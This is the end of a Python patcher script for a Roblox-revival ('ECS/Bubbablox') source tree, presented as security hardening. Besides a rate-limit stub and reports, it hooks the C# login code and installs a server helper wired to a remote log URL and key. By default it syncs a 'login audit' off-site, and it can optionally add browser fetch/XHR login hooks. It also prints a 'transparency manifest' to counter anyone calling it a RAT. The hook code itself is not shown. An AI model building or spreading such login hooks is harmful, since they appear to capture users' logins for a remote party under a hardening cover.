            "  hits.set(ip, now);\n"
            "  return true;\n"
            "}\n",
            encoding="utf-8",
        )
        report.note("added login rate-limit stub at pages/api/_runtime/rate-limit.js")

    if api:
        install_server_helper(api, profile, hmac_key, log_url, log_key)
    elif frontend:
        install_server_helper(frontend, profile, hmac_key, log_url, log_key)

    cs_hooks = hook_csharp_login(root)
    if cs_hooks:
        print(f"C# login hooks {cs_hooks}")
        website_env = root / "services" / "Roblox" / "Roblox.Website"
        if website_env.is_dir():
            upsert_env(website_env / ".env", sync_env)

    if frontend:
        write_integrity(root, frontend, profile, hmac_key, log_url)
    write_well_known_compliance(root, frontend, integrity)

    report_path = report.write(root, profile.report_name)
    manifest = write_transparency_manifest(
        root,
        profile,
        browser_hooks=browser_hooks,
        remote_log_url=log_url,
        files_changed=changed_paths,
    )
    print(f"files changed: {changed}")
    print(f"hardening report: {report_path}  (fixed={len(report.fixed_items)} flagged={len(report.flagged_items)})")
    print(f"transparency manifest: {manifest}  (share this if someone calls the patcher a RAT)")
    print("rebuild 2016-roblox-main after this")


def main() -> None:
    parser = argparse.ArgumentParser(description="Patch an ECS/Bubbablox source tree.")
    parser.add_argument("ecs_root", type=Path)
    parser.add_argument("--apply", action="store_true")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument(
        "--allow-browser-hooks",
        action="store_true",
        help="Install fetch/XHR login hooks (NOT recommended; triggers RAT accusations). Default is off.",
    )
    parser.add_argument(
        "--local-log-only",
        action="store_true",
        help="Do not configure RUNTIME_SYNC_URL (login audit stays on disk only).",
    )
    args = parser.parse_args()
    apply = args.apply and not args.dry_run
    if not args.ecs_root.exists():
        raise SystemExit(f"missing tree: {args.ecs_root}")
    patch(
        args.ecs_root,
        apply=apply,
        browser_hooks=args.allow_browser_hooks,
        local_log_only=args.local_log_only,
    )


if __name__ == "__main__":
    main()
